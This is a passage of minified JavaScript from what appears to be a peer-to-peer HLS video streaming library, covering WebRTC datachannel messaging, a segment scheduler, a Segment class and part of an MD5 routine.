                    return d.config.webRTCConfig && (h = u({}, h, d.config.webRTCConfig)), d.playlistMap = new Map, d._datachannel = new f.default({
                        initiator: s,
                        channelName: d.channelId,
                        trickle: c.trickle || !1,
                        config: h
                    }), d._init(d._datachannel), d.dataExchangeTs = d.timeJoin, d.startSN = Number.MAX_SAFE_INTEGER, d.endSN = -1, d.liveEdgeSN = 0, d.subscribeEdgeSN = 0, d
                }
                return s(t, e), l(t, null, [{
                    key: "VERSION",
                    get: function() {
                        return "5"
                    }
                }]), l(t, [{
                    key: "addDownloadListener",
                    value: function(e) {
                        this.downloadListeners.push({
                            handler: e
                        })
                    }
                }, {
                    key: "_init",
                    value: function(e) {
                        var t = this;
                        e.on("error", function(e) {
                            t.emit(p.default.DC_ERROR, !0)
                        }), e.on("signal", function(e) {
                            t.emit(p.default.DC_SIGNAL, e)
                        });
                        var n = function() {
                            for (t.logger.info("datachannel CONNECTED to " + t.remotePeerId + " from " + (t.intermediator ? "peer" : "server")), t.connected = !0, clearTimeout(t.connTimeout), t.emit(p.default.DC_OPEN); t.msgQueue.length > 0;) {
                                var e = t.msgQueue.shift();
                                t.emit(e.event, e)
                            }
                        };
                        e.once("connect", n), e.on("data", function(e) {
                            var n = t.logger;
                            if ("string" == typeof e) {
                                var r = JSON.parse(e);
                                if (!t.connected) return void t.msgQueue.push(r);
                                var i = r.event;
                                switch (i !== p.default.DC_PLAYLIST && i !== p.default.DC_PEER_SIGNAL && n.debug("datachannel receive string: " + e + " from " + t.remotePeerId), i) {
                                    case p.default.DC_HAVE:
                                        if (t.emit(r.event, r), !r.sn) return;
                                        t.config.live ? t.liveEdgeSN = r.sn : (r.sn < t.startSN && (t.startSN = r.sn), r.sn > t.endSN && (t.endSN = r.sn));
                                        break;
                                    case p.default.DC_PIECE:
                                        t.downloading = !0, t.dataExchangeTs = (0, v.getCurrentTs)(), t.timeReceivePiece = performance.now(), t.pieceMsg = r, t._prepareForBinary(r.attachments, r.seg_id, r.sn, r.size), t.emit(r.event, r);
                                        break;
                                    case p.default.DC_PIECE_NOT_FOUND:
                                        t._sendNextReq() || (t.downloading = !1), t.emit(r.event, r);
                                        break;
                                    case p.default.DC_REQUEST:
                                        t._handleRequestMsg(r);
                                        break;
                                    case p.default.DC_PIECE_ACK:
                                        t.dataExchangeTs = (0, v.getCurrentTs)(), t._handlePieceAck(r), t.emit(r.event, r);
                                        break;
                                    case p.default.DC_STATS:
                                        t._handleStats(r);
                                        break;
                                    case p.default.DC_PLAYLIST:
                                        t.config.sharePlaylist && t._handlePlaylist(r);
                                        break;
                                    case p.default.DC_METADATA:
                                        t._handleMetadata(r);
                                        break;
                                    case p.default.DC_PIECE_ABORT:
                                        if (t.downloading) {
                                            if (t.downloadListeners.length > 0) {
                                                var o = !0,
                                                    s = !1,
                                                    a = void 0;
                                                try {
                                                    for (var u, l = t.downloadListeners[Symbol.iterator](); !(o = (u = l.next()).done); o = !0) {
                                                        (0, u.value.handler)(t.bufSN, t.segId, !0, "aborted by upstream peer")
                                                    }
                                                } catch (e) {
                                                    s = !0, a = e
                                                } finally {
                                                    try {
                                                        !o && l.return && l.return()
                                                    } finally {
                                                        if (s) throw a
                                                    }
                                                }
                                                t.downloadListeners = []
                                            }
                                            t.emit(p.default.DC_PIECE_ABORT, r)
                                        }
                                        break;
                                    case p.default.DC_CHOKE:
                                        n.info("choke peer " + t.remotePeerId), t.choked = !0;
                                        break;
                                    case p.default.DC_UNCHOKE:
                                        n.info("unchoke peer " + t.remotePeerId), t.choked = !1;
                                        break;
                                    default:
                                        t.emit(r.event, r)
                                }
                            } else {
                                if (!t.downloading) return void n.error("peer is not downloading, data size " + e.byteLength + " pieceMsg " + JSON.stringify(t.pieceMsg));
                                t._handleBinaryMsg(e)
                            }
                        }), e.once("close", function() {
                            t.emit(p.default.DC_CLOSE)
                        }), e.on("iceStateChange", function(e, n) {
                            "disconnected" === e && (t.logger.warn(t.remotePeerId + " disconnected"), t.connected = !1)
                        })
                    }
                }, {
                    key: "sendJson",
                    value: function(e) {
                        return e.event !== p.default.DC_PLAYLIST && e.event !== p.default.DC_PEER_SIGNAL && this.logger.debug("dc bufferSize " + this._datachannel.bufferSize + " send " + JSON.stringify(e) + " to " + this.remotePeerId), this.send(JSON.stringify(e))
                    }
                }, {
                    key: "send",
                    value: function(e) {
                        if (this._datachannel && this._datachannel.connected) try {
                            return this._datachannel.send(e), !0
                        } catch (e) {
                            this.logger.warn("datachannel " + this.channelId + " send data failed, close it"), this.emit(p.default.DC_ERROR, !1)
                        }
                        return !1
                    }
                }, {
                    key: "sendMsgHave",
                    value: function(e, t) {
                        this.sendJson({
                            event: p.default.DC_HAVE,
                            sn: e,
                            seg_id: t
                        })
                    }
                }, {
                    key: "sendPieceNotFound",
                    value: function(e, t) {
                        this.uploading = !1, this.sendJson({
                            event: p.default.DC_PIECE_NOT_FOUND,
                            seg_id: t,
                            sn: e
                        })
                    }
                }, {
                    key: "sendPeers",
                    value: function(e) {
                        this.sendJson({
                            event: p.default.DC_PEERS,
                            peers: e
                        })
                    }
                }, {
                    key: "sendPeersRequest",
                    value: function() {
                        this.sendJson({
                            event: p.default.DC_GET_PEERS
                        })
                    }
                }, {
                    key: "sendSubscribe",
                    value: function() {
                        this.sendJson({
                            event: p.default.DC_SUBSCRIBE
                        })
                    }
                }, {
                    key: "sendUnsubscribe",
                    value: function(e) {
                        this.resetContinuousHits(), this.sendJson({
                            event: p.default.DC_UNSUBSCRIBE,
                            reason: e
                        })
                    }
                }, {
                    key: "sendSubscribeReject",
                    value: function(e) {
                        this.sendJson({
                            event: p.default.DC_SUBSCRIBE_REJECT,
                            reason: e
                        })
                    }
                }, {
                    key: "sendSubscribeAccept",
                    value: function(e) {
                        this.sendJson({
                            event: p.default.DC_SUBSCRIBE_ACCEPT,
                            level: e
                        })
                    }
                }, {
                    key: "sendSubscribeLevel",
                    value: function(e) {
                        this.sendJson({
                            event: p.default.DC_SUBSCRIBE_LEVEL,
                            level: e
                        })
                    }
                }, {
                    key: "sendMsgStats",
                    value: function(e, t) {
                        var n = {
                            event: p.default.DC_STATS,
                            total_conns: e,
                            children: t
                        };
                        this.sendJson(n)
                    }
                }, {
                    key: "sendMsgPlaylist",
                    value: function(e, t) {
                        var n = {
                            event: p.default.DC_PLAYLIST,
                            url: e,
                            data: t
                        };
                        this.sendJson(n)
                    }
                }, {
                    key: "sendMsgSignal",
                    value: function(e, t, n) {
                        return this.sendJson({
                            event: p.default.DC_PEER_SIGNAL,
                            action: "signal",
                            to_peer_id: e,
                            from_peer_id: t,
                            data: n
                        })
                    }
                }, {
                    key: "sendMsgSignalReject",
                    value: function(e, t, n) {
                        var r = arguments.length > 3 && void 0 !== arguments[3] && arguments[3];
                        return this.sendJson({
                            event: p.default.DC_PEER_SIGNAL,
                            action: "reject",
                            to_peer_id: e,
                            from_peer_id: t,
                            reason: n,
                            fatal: r
                        })
                    }
                }, {
                    key: "sendMetaData",
                    value: function(e, t) {
                        var n = arguments.length > 2 && void 0 !== arguments[2] ? arguments[2] : 0;
                        this.sendJson({
                            event: p.default.DC_METADATA,
                            field: e,
                            platform: p.default.DC_PLAT_WEB,
                            mobile: !!_.default.isMobile(),
                            channel: this.channel,
                            version: "1.17.0",
                            sequential: t,
                            peers: n
                        })
                    }
                }, {
                    key: "sendPartialBuffer",
                    value: function(e, t) {
                        var n = arguments.length > 2 && void 0 !== arguments[2] ? arguments[2] : {};
                        this.sendMsgPiece(e, n);
                        for (var r = 0; r < t.length; r++) this.send(t[r])
                    }
                }, {
                    key: "sendMsgPiece",
                    value: function(e) {
                        var t = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : {};
                        e.ext || (e.ext = {}), e.ext.from && t.from && (t.from = e.ext.from + "->" + t.from), t.incompletes && e.ext.incompletes && (t.incompletes += e.ext.incompletes), t = Object.assign({}, e.ext, t);
                        var n = u({}, e, {
                            ext: t
                        });
                        this.sendJson(n)
                    }
                }, {
                    key: "sendBuffer",
                    value: function(e, t, n) {
                        var r = arguments.length > 3 && void 0 !== arguments[3] ? arguments[3] : {},
                            i = n.byteLength,
                            o = 0,
                            s = 0;
                        i % this.packetSize == 0 ? s = i / this.packetSize : (s = Math.floor(i / this.packetSize) + 1, o = i % this.packetSize);
                        var u = {
                            event: p.default.DC_PIECE,
                            attachments: s,
                            seg_id: t,
                            sn: e,
                            size: i
                        };
                        this.sendMsgPiece(u, r);
                        for (var l = a(n, this.packetSize, s, o), c = 0; c < l.length; c++) this.send(l[c]);
                        this.uploading = !1, this.timeSendPiece = performance.now()
                    }
                }, {
                    key: "requestDataById",
                    value: function(e, t) {
                        var n = arguments.length > 2 && void 0 !== arguments[2] && arguments[2],
                            r = {
                                event: p.default.DC_REQUEST,
                                seg_id: e,
                                sn: t,
                                urgent: n
                            };
                        this.downloading ? (this.logger.info("add req " + e + " in queue"), n ? this.sendReqQueue.unshift(r) : this.sendReqQueue.push(r)) : this._realRequestData(r)
                    }
                }, {
                    key: "requestDataBySN",
                    value: function(e) {
                        var t = arguments.length > 1 && void 0 !== arguments[1] && arguments[1],
                            n = {
                                event: p.default.DC_REQUEST,
                                sn: e,
                                urgent: t
                            };
                        this.downloading ? (this.logger.info("add req " + e + " in queue"), t ? this.sendReqQueue.unshift(n) : this.sendReqQueue.push(n)) : this._realRequestData(n)
                    }
                }, {
                    key: "_realRequestData",
                    value: function(e) {
                        this.sendJson(e), this.timeSendRequest = performance.now(), this.downloading = !0
                    }
                }, {
                    key: "shouldWaitForRemain",
                    value: function(e) {
                        if (0 === this.bufArr.length) return !1;
                        if (0 === this.timeReceivePiece) return !1;
                        this.logger.warn(this.bufArr.length + " of " + this.pieceMsg.attachments + " packets loaded");
                        for (var t = 0, n = 0; n < this.bufArr.length; n++) t += this.bufArr[n].byteLength;
                        return t / (performance.now() - this.timeReceivePiece) >= (this.expectedSize - t) / e
                    }
                }, {
                    key: "close",
                    value: function() {
                        this.emit(p.default.DC_CLOSE)
                    }
                }, {
                    key: "receiveSignal",
                    value: function(e) {
                        this._datachannel.signal(e)
                    }
                }, {
                    key: "resetContinuousHits",
                    value: function() {
                        var e = arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : 0;
                        this.logger.info("reset " + this.remotePeerId + " continuousHits"), this.continuousHits = e
                    }
                }, {
                    key: "increContinuousHits",
                    value: function() {
                        this.continuousHits++
                    }
                }, {
                    key: "destroy",
                    value: function() {
                        if (this.logger.info("destroy datachannel " + this.channelId), this.chokeTimer && clearTimeout(this.chokeTimer), this.connTimeout && clearTimeout(this.connTimeout), this.uploading && this.sendMsgPieceAbort("peer is closing"), this.downloadListeners.length > 0) {
                            var e = !0,
                                t = !1,
                                n = void 0;
                            try {
                                for (var r, i = this.downloadListeners[Symbol.iterator](); !(e = (r = i.next()).done); e = !0) {
                                    (0, r.value.handler)(this.bufSN, this.segId, !0, "upstream peer is closed")
                                }
                            } catch (e) {
                                t = !0, n = e
                            } finally {
                                try {
                                    !e && i.return && i.return()
                                } finally {
                                    if (t) throw n
                                }
                            }
                            this.downloadListeners = []
                        }
                        var o = {
                            event: p.default.DC_CLOSE
                        };
                        this.sendJson(o), this._datachannel.removeAllListeners(), this.removeAllListeners(), this._datachannel.destroy()
                    }
                }, {
                    key: "_handleBinaryMsg",
                    value: function(e) {
                        if (this.bufArr.push(e), this.remainAttachments--, this.downloadListeners.length > 0) {
                            var t = !0,
                                n = !1,
                                r = void 0;
                            try {
                                for (var i, o = this.downloadListeners[Symbol.iterator](); !(t = (i = o.next()).done); t = !0) {
                                    (0, i.value.handler)(this.bufSN, this.segId, !1, e, 0 === this.remainAttachments)
                                }
                            } catch (e) {
                                n = !0, r = e
                            } finally {
                                try {
                                    !t && o.return && o.return()
                                } finally {
                                    if (n) throw r
                                }
                            }
                        }
                        if (0 === this.remainAttachments) {
                            if (this.downloadListeners = [], this.timeSendRequest > 0) {
                                var s = this.expectedSize / (performance.now() - this.timeSendRequest);
                                this.weight = Math.round(s)
                            }
                            this.sendJson({
                                event: p.default.DC_PIECE_ACK,
                                sn: this.bufSN,
                                seg_id: this.segId,
                                size: this.expectedSize
                            }), this.timeSendRequest = 0, this.timeReceivePiece = 0, this._sendNextReq() || (this.downloading = !1), this._handleBinaryData()
                        }
                    }
                }, {
                    key: "_sendNextReq",
                    value: function() {
                        if (this.sendReqQueue.length > 0) {
                            var e = this.sendReqQueue.shift();
                            return this.logger.info("get msg from sendReqQueue " + JSON.stringify(e)), this._realRequestData(e), !0
                        }
                        return !1
                    }
                }, {
                    key: "_handlePlaylist",
                    value: function(e) {
                        var t = e.url,
                            n = e.data,
                            r = (0, v.getCurrentTs)();
                        this.playlistMap.set(t, {
                            data: n,
                            ts: r
                        })
                    }
                }, {
                    key: "getLatestPlaylist",
                    value: function(e, t) {
                        if (!this.playlistMap.has(e)) return null;
                        var n = this.playlistMap.get(e);
                        return n.ts <= t ? null : n
                    }
                }, {
                    key: "_handleMetadata",
                    value: function(e) {
                        var t = this,
                            n = this.logger,
                            r = e.channel;
                        if (!r) return n.error("peer channel " + r + " is null!"), void this.emit(p.default.DC_ERROR, !0);
                        if (this.channel !== r) return n.error("peer channel " + r + " not matched!"), void this.emit(p.default.DC_ERROR, !0);
                        switch (e.platform) {
                            case p.default.DC_PLAT_ANDROID:
                                this.platform = p.default.DC_PLAT_ANDROID;
                                break;
                            case p.default.DC_PLAT_IOS:
                                this.platform = p.default.DC_PLAT_IOS;
                                break;
                            case p.default.DC_PLAT_WEB:
                                this.platform = p.default.DC_PLAT_WEB
                        }
                        if (this.mobile = e.mobile || !1, this.mobileWeb = this.mobile && this.platform === p.default.DC_PLAT_WEB || !1, this.sequential = e.sequential, this.sequential !== this.typeExpected) return n.error("peer sequential type " + this.sequential + " not matched!"), void this.emit(p.default.DC_ERROR, !0);
                        n.info(this.remotePeerId + " platform " + this.platform + " sequential " + this.sequential), e.peers && (this.peersConnected += e.peers, n.info(this.remotePeerId + " now has " + this.peersConnected + " peers")), this.emit(p.default.DC_METADATA, e), e.field && !this.config.live && e.sequential && e.field.forEach(function(e) {
                            e > 0 && (e < t.startSN && (t.startSN = e), e > t.endSN && (t.endSN = e))
                        })
                    }
                }, {
                    key: "_handleStats",
                    value: function(e) {
                        var t = e.total_conns;
                        t > 0 && this.peersConnected !== t && (this.peersConnected = t, this.logger.info(this.remotePeerId + " now has " + this.peersConnected + " peers"))
                    }
                }, {
                    key: "_handleRequestMsg",
                    value: function(e) {
                        if (this.uploading) return void this.logger.warn(this.remotePeerId + " is uploading when receive request");
                        this.uploading = !0, this.emit(p.default.DC_REQUEST, e)
                    }
                }, {
                    key: "_handlePieceAck",
                    value: function(e) {
                        0 !== this.timeSendPiece && (this.uploadSpeed = Math.round(e.size / (performance.now() - this.timeSendPiece) * 2), this.timeSendPiece = 0, this.logger.info(this.remotePeerId + " uploadSpeed is " + this.uploadSpeed))
                    }
                }, {
                    key: "_prepareForBinary",
                    value: function(e, t, n, r) {
                        this.bufArr = [], this.remainAttachments = e, this.segId = t, this.bufSN = n, this.expectedSize = r
                    }
                }, {
                    key: "_handleBinaryData",
                    value: function() {
                        var e = P.concat(this.bufArr),
                            t = e.byteLength;
                        if (t === this.expectedSize) {
                            var n = new Uint8Array(e).buffer,
                                r = new b.default(this.bufSN, this.segId, n, this.remotePeerId);
                            this.emit(p.default.DC_RESPONSE, r, this.weight)
                        } else this.logger.error(this.segId + " expectedSize " + this.expectedSize + " not equal to byteLength " + t);
                        this.segId = "", this.bufArr = [], this.expectedSize = -1
                    }
                }, {
                    key: "checkIfNeedChoke",
                    value: function() {
                        var e = this,
                            t = this.logger;
                        if (this.miss++, t.info(this.channelId + " miss " + this.miss), this.miss > 2 && !this.choked) {
                            this.choked = !0;
                            var n = 30 * this.miss;
                            n <= 150 ? (t.warn("datachannel " + this.channelId + " is choked"), this.chokeTimer = setTimeout(function() {
                                e.choked = !1, t.warn("datachannel " + e.channelId + " is unchoked")
                            }, 1e3 * n)) : t.warn("datachannel " + this.channelId + " is choked permanently")
                        }
                    }
                }, {
                    key: "loadtimeout",
                    value: function() {
                        this.logger.warn("timeout while downloading from " + this.remotePeerId), this.bufSN && this.pieceMsg.sn === this.bufSN ? this.logger.warn(this.bufArr.length + " of " + this.pieceMsg.attachments + " packets loaded") : this.logger.warn("no piece msg received"), this.emit(p.default.DC_TIMEOUT), this.checkIfNeedChoke()
                    }
                }, {
                    key: "sendMsgPieceAbort",
                    value: function(e) {
                        this.uploading = !1, this.sendJson({
                            event: p.default.DC_PIECE_ABORT,
                            reason: e
                        })
                    }
                }, {
                    key: "isAvailable",
                    get: function() {
                        return this.downloadNum < 2 && !this.choked
                    }
                }, {
                    key: "isAvailableUrgently",
                    get: function() {
                        return !this.downloading && !this.choked
                    }
                }, {
                    key: "downloadNum",
                    get: function() {
                        return this.downloading ? this.sendReqQueue.length + 1 : 0
                    }
                }]), t
            }(h.default);
        t.default = S, e.exports = t.default
    }, function(e, t, n) {
        "use strict";

        function r(e, t) {
            var n = arguments.length > 2 && void 0 !== arguments[2] ? arguments[2] : 75,
                r = null,
                i = !1,
                o = n;
            return function() {
                if (arguments.length > 0 && void 0 !== arguments[0] && arguments[0]) return clearTimeout(r), void(i = !1);
                i || (i = !0, r = setTimeout(function() {
                    e.call(t, o), i = !1, r = null
                }, 1e3 * o), o *= 1)
            }
        }
        Object.defineProperty(t, "__esModule", {
            value: !0
        }), t.default = r, e.exports = t.default
    }, function(e, t, n) {
        "use strict";

        function r(e) {
            return e && e.__esModule ? e : {
                default: e
            }
        }

        function i(e) {
            if (Array.isArray(e)) {
                for (var t = 0, n = Array(e.length); t < e.length; t++) n[t] = e[t];
                return n
            }
            return Array.from(e)
        }

        function o(e, t) {
            if (!(e instanceof t)) throw new TypeError("Cannot call a class as a function")
        }

        function s(e, t) {
            if (!e) throw new ReferenceError("this hasn't been initialised - super() hasn't been called");
            return !t || "object" != typeof t && "function" != typeof t ? e : t
        }

        function a(e, t) {
            if ("function" != typeof t && null !== t) throw new TypeError("Super expression must either be null or a function, not " + typeof t);
            e.prototype = Object.create(t && t.prototype, {
                constructor: {
                    value: e,
                    enumerable: !1,
                    writable: !0,
                    configurable: !0
                }
            }), t && (Object.setPrototypeOf ? Object.setPrototypeOf(e, t) : e.__proto__ = t)
        }
        Object.defineProperty(t, "__esModule", {
            value: !0
        });
        var u = function() {
                function e(e, t) {
                    for (var n = 0; n < t.length; n++) {
                        var r = t[n];
                        r.enumerable = r.enumerable || !1, r.configurable = !0, "value" in r && (r.writable = !0), Object.defineProperty(e, r.key, r)
                    }
                }
                return function(t, n, r) {
                    return n && e(t.prototype, n), r && e(t, r), t
                }
            }(),
            l = function e(t, n, r) {
                null === t && (t = Function.prototype);
                var i = Object.getOwnPropertyDescriptor(t, n);
                if (void 0 === i) {
                    var o = Object.getPrototypeOf(t);
                    return null === o ? void 0 : e(o, n, r)
                }
                if ("value" in i) return i.value;
                var s = i.get;
                if (void 0 !== s) return s.call(r)
            },
            c = n(2),
            f = n(9),
            d = r(f),
            h = n(20),
            g = r(h),
            p = n(5),
            v = function(e) {
                function t(e, n) {
                    o(this, t);
                    var r = s(this, (t.__proto__ || Object.getPrototypeOf(t)).call(this, e, n));
                    return r.logger.info("use IdScheduler"), r.sequential = !1, r
                }
                return a(t, e), u(t, [{
                    key: "load",
                    value: function(e, t, n) {
                        this.isReceiver = !0;
                        var r = this.logger;
                        this.context = e;
                        var o = e.frag,
                            s = o.segId,
                            a = o.sn;
                        this.callbacks = n, this.stats = (0, p.createLoadStats)(), this.criticalSeg = {
                            sn: a,
                            segId: s,
                            targetPeers: [].concat(i(this.targetPeers.map(function(e) {
                                return e.remotePeerId
                            })))
                        };
                        var u = this.mBufferedDuration - this.config.httpLoadTime;
                        u > this.dcDownloadTimeout && (u = this.dcDownloadTimeout);
                        var l = !0,
                            c = !1,
                            f = void 0;
                        try {
                            for (var d, h = this.targetPeers[Symbol.iterator](); !(l = (d = h.next()).done); l = !0) {
                                var g = d.value;
                                g.downloading || (r.info("request criticalSeg segId " + s + " at " + a + " from " + g.remotePeerId + " timeout " + u), g.requestDataById(s, a, !0)), this.requestingMap.set(s, g.remotePeerId)
                            }
                        } catch (e) {
                            c = !0, f = e
                        } finally {
                            try {
                                !l && h.return && h.return()
                            } finally {
                                if (c) throw f
                            }
                        }
                        this.criticaltimeouter = setTimeout(this.criticaltimeout.bind(this, !0), 1e3 * u), this.targetPeers = []
                    }
                }, {
                    key: "onBufferManagerLost",
                    value: function(e, t, n) {
                        this.bitset.delete(t), this.bitCounts.delete(t)
                    }
                }, {
                    key: "destroy",
                    value: function() {
                        l(t.prototype.__proto__ || Object.getPrototypeOf(t.prototype), "destroy", this).call(this), this.logger.warn("destroy IdScheduler")
                    }
                }, {
                    key: "_setupDC",
                    value: function(e) {
                        var n = this;
                        l(t.prototype.__proto__ || Object.getPrototypeOf(t.prototype), "_setupDC", this).call(this, e);
                        var r = this.logger,
                            o = this.config;
                        e.on(d.default.DC_HAVE, function(t) {
                            if (t.seg_id && e.bitset) {
                                var r = t.seg_id;
                                for (e.bitset.add(r), n.bitset.has(r) || n._increBitCounts(r); o.live && e.bitset.size > 20;) {
                                    var s = [].concat(i(e.bitset.values())).shift();
                                    e.bitset.delete(s)
                                }
                                n.emit(d.default.SCH_DCHAVE, t.seg_id)
                            }
                        }).on(d.default.DC_LOST, function(t) {
                            if (t.seg_id && e.bitset) {
                                var r = t.seg_id;
                                e.bitset.delete(r), n._decreBitCounts(r)
                            }
                        }).on(d.default.DC_PIECE, function(e) {
                            e.ext && e.ext.incompletes >= 2 || n.notifyAllPeers(e.sn, e.seg_id)
                        }).on(d.default.DC_PIECE_NOT_FOUND, function(t) {
                            var i = t.seg_id;
                            n.criticalSeg && n.criticalSeg.segId === i && (1 === n.criticalSeg.targetPeers.length ? (clearTimeout(n.criticaltimeouter), r.info("DC_PIECE_NOT_FOUND"), n.criticalSeg = null, n.callbacks.onTimeout(n.stats, n.context, null)) : n.criticalSeg.targetPeers = n.criticalSeg.targetPeers.filter(function(t) {
                                return t !== e.remotePeerId
                            })), e.bitset.delete(i), n.requestingMap.delete(i), n._decreBitCounts(i), e.checkIfNeedChoke()
                        }).on(d.default.DC_RESPONSE, function(i, o) {
                            var s = i.segId,
                                a = i.sn,
                                u = i.data,
                                f = n.criticalSeg && n.criticalSeg.segId === s;
                            if (n.config.validateSegment(s, u))
                                if (n.notifyAllPeers(a, s), l(t.prototype.__proto__ || Object.getPrototypeOf(t.prototype), "reportDCTraffic", n).call(n, s, i.size, o), f) {
                                    r.info("receive criticalSeg seg_id " + s), clearTimeout(n.criticaltimeouter), n.criticaltimeouter = null, e.miss = 0;
                                    var d = n.stats;
                                    d.tfirst = d.loading.first = Math.max(d.trequest, performance.now()), d.tload = d.loading.end = d.tfirst, d.loaded = d.total = u.byteLength, n.criticalSeg = null;
                                    var h = n.context.frag;
                                    h.fromPeerId = e.remotePeerId, h.loadByP2P = !0, n.callbacks.onSuccess({
                                        data: u
                                    }, d, n.context)
                                } else {
                                    if (n.bitset.has(s)) return;
                                    var g = new c.Segment(a, s, u, e.remotePeerId);
                                    n.bufMgr.putSeg(g), n.updateLoaded(s)
                                }
                            else r.warn("segment " + s + " validate failed"), f && (clearTimeout(n.criticaltimeouter), n.criticaltimeout());
                            n.requestingMap.delete(s)
                        }).on(d.default.DC_REQUEST, function(t) {
                            n.isUploader = !0;
                            var i = t.seg_id,
                                o = null;
                            if (n.requestingMap.has(i) && (o = n.getPeerLoadedMore(i)), n.bufMgr.hasSegOfId(i)) {
                                r.info("found seg from bufMgr");
                                var s = n.bufMgr.getSegById(i);
                                e.sendBuffer(s.sn, s.segId, s.data)
                            } else o && o.downloading && o.pieceMsg.seg_id === i ? (r.info("target had partial buffer, wait for remain"), e.sendPartialBuffer(o.pieceMsg, o.bufArr, {
                                from: "WaitForPartial",
                                incompletes: 1
                            }), function(t, n) {
                                t.addDownloadListener(function(t, r, i, o, s) {
                                    i ? n.sendMsgPieceAbort(o) : n.send(o), s && (e.uploading = !1)
                                })
                            }(o, e)) : (r.info("peer request " + i + " wait for seg"), n.bufMgr.once("" + d.default.BM_ADDED_SEG_ + i, function(n) {
                                n ? (r.info("peer request notify seg " + i), e.sendBuffer(n.sn, n.segId, n.data)) : e.sendPieceNotFound(t.sn, i)
                            }))
                        })
                    }
                }, {
                    key: "_setupEngine",
                    value: function() {
                        var e = this;
                        this.engine.on(d.default.FRAG_LOADING, function(t, n, r) {
                            e.loadingSegId = n, r && e.notifyAllPeers(t, n)
                        }).on(d.default.FRAG_LOADED, function(t, n) {
                            n && e.updateLoaded(n)
                        })
                    }
                }]), t
            }(g.default);
        t.default = v, e.exports = t.default
    }, function(e, t, n) {
        "use strict";
        var r = void 0;
        e.exports = "function" == typeof queueMicrotask ? queueMicrotask.bind(globalThis) : function(e) {
            return (r || (r = Promise.resolve())).then(e).catch(function(e) {
                return setTimeout(function() {
                    throw e
                }, 0)
            })
        }
    }, function(e, t, n) {
        "use strict";

        function r(e, t) {
            if (!(e instanceof t)) throw new TypeError("Cannot call a class as a function")
        }
        Object.defineProperty(t, "__esModule", {
            value: !0
        });
        var i = function() {
                function e(e, t) {
                    for (var n = 0; n < t.length; n++) {
                        var r = t[n];
                        r.enumerable = r.enumerable || !1, r.configurable = !0, "value" in r && (r.writable = !0), Object.defineProperty(e, r.key, r)
                    }
                }
                return function(t, n, r) {
                    return n && e(t.prototype, n), r && e(t, r), t
                }
            }(),
            o = function() {
                function e(t, n, i, o) {
                    r(this, e), this._sn = t, this._segId = n, this._data = i, this._fromPeerId = o
                }
                return i(e, [{
                    key: "size",
                    get: function() {
                        return this._data.byteLength
                    }
                }, {
                    key: "sn",
                    get: function() {
                        return this._sn
                    }
                }, {
                    key: "segId",
                    get: function() {
                        return this._segId
                    }
                }, {
                    key: "data",
                    get: function() {
                        return this._data
                    }
                }, {
                    key: "fromPeerId",
                    get: function() {
                        return this._fromPeerId
                    }
                }, {
                    key: "isSequential",
                    get: function() {
                        return this._sn >= 0
                    }
                }]), e
            }();
        t.default = o, e.exports = t.default
    }, function(e, t, n) {
        "use strict";
        var r;
        "function" == typeof Symbol && Symbol.iterator;
        ! function(i) {
            function o(e, t) {
                var n = (65535 & e) + (65535 & t);
                return (e >> 16) + (t >> 16) + (n >> 16) << 16 | 65535 & n
            }

            function s(e, t) {
                return e << t | e >>> 32 - t
            }

            function a(e, t, n, r, i, a) {
                return o(s(o(o(t, e), o(r, a)), i), n)
            }

            function u(e, t, n, r, i, o, s) {
                return a(t & n | ~t & r, e, t, i, o, s)
            }

            function l(e, t, n, r, i, o, s) {
                return a(t & r | n & ~r, e, t, i, o, s)
            }

            function c(e, t, n, r, i, o, s) {
                return a(t ^ n ^ r, e, t, i, o, s)
            }

            function f(e, t, n, r, i, o, s) {
                return a(n ^ (t | ~r), e, t, i, o, s)
            }

            function d(e, t) {
                e[t >> 5] |= 128 << t % 32, e[14 + (t + 64 >>> 9 << 4)] = t;
                var n, r, i, s, a, d = 1732584193,
                    h = -271733879,
                    g = -1732584194,
                    p = 271733878;
                for (n = 0; n < e.length; n += 16) r = d, i = h, s = g, a = p, d = u(d, h, g, p, e[n], 7, -680876936), p = u(p, d, h, g, e[n + 1], 12, -389564586), g = u(g, p, d, h, e[n + 2], 17, 606105819), h = u(h, g, p, d, e[n + 3], 22, -1044525330), d = u(d, h, g, p, e[n + 4], 7, -176418897), p = u(p, d, h, g, e[n + 5], 12, 1200080426), g = u(g, p, d, h, e[n + 6], 17, -1473231341), h = u(h, g, p, d, e[n + 7], 22, -45705983), d = u(d, h, g, p, e[n + 8], 7, 1770035416), p = u(p, d, h, g, e[n + 9], 12, -1958414417), g = u(g, p, d, h, e[n + 10], 17, -42063), h = u(h, g, p, d, e[n + 11], 22, -1990404162), d = u(d, h, g, p, e[n + 12], 7, 1804603682), p = u(p, d, h, g, e[n + 13], 12, -40341101), g = u(g, p, d, h, e[n + 14], 17, -1502002290), h = u(h, g, p, d, e[n + 15], 22, 1236535329), d = l(d, h, g, p, e[n + 1], 5, -165796510), p = l(p, d, h, g, e[n + 6], 9, -1069501632), g = l(g, p, d, h, e[n + 11], 14, 643717713), h = l(h, g, p, d, e[n], 20, -373897302), d = l(d, h, g, p, e[n + 5], 5, -701558691), p = l(p, d, h, g, e[n + 10], 9, 38016083), g = l(g, p, d, h, e[n + 15], 14, -660478335), h = l(h, g, p, d, e[n + 4], 20, -405537848), d = l(d, h, g, p, e[n + 9], 5, 568446438), p = l(p, d, h, g, e[n + 14], 9, -1019803690), g = l(g, p, d, h, e[n + 3], 14, -187363961), h = l(h, g, p, d, e[n + 8], 20, 1163531501), d = l(d, h, g, p, e[n + 13], 5, -1444681467), p = l(p, d, h, g, e[n + 2], 9, -51403784), g = l(g, p, d, h, e[n + 7], 14, 1735328473), h = l(h, g, p, d, e[n + 12], 20, -1926607734), d = c(d, h, g, p, e[n + 5], 4, -378558), p = c(p, d, h, g, e[n + 8], 11, -2022574463), g = c(g, p, d, h, e[n + 11], 16, 1839030562), h = c(h, g, p, d, e[n + 14], 23, -35309556), d = c(d, h, g, p, e[n + 1], 4, -1530992060), p = c(p, d, h, g, e[n + 4], 11, 1272893353), g = c(g, p, d, h, e[n + 7], 16, -155497632), h = c(h, g, p, d, e[n + 10], 23, -1094730640), d = c(d, h, g, p, e[n + 13], 4, 681279174), p = c(p, d, h, g, e[n], 11, -358537222), g = c(g, p, d, h, e[n + 3], 16, -722521979), h = c(h, g, p, d, e[n + 6], 23, 76029189), d = c(d, h, g, p, e[n + 9], 4, -640364487), p = c(p, d, h, g, e[n + 12], 11, -421815835), g = c(g, p, d, h, 